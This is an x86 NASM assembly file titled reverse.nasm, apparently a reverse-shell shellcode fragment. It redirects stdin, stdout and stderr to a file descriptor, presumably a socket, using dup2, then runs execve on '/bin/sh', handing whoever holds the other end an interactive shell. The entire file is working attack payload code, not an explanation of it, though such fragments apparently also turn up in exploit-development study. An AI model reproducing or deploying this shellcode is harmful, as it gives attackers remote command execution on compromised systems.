; reverse.nasm
; Author: Bo Pearce

global _start

section .text
_start: 

	;dup2
    cdq

	mov ebx, edi ;file descriptor
	mov ecx, 0x0	
	mov al, 0x3f
	int 0x80

	mov cl, 0x1
	mov al, 0x3f
	int 0x80

	mov cl, 0x2
	mov al, 0x3f
	int 0x80

	;int execve(const char *filename, char *const argv[], char *const envp[]);
	push edx ;NULL
    push 0x68732f6e ;/bin/sh
    push 0x69622f2f
	mov ebx, esp ;pointer to filename
	push edx ;NULL
	push ebx 
	mov ecx, esp
	mov al, 0xb
	int 0x80

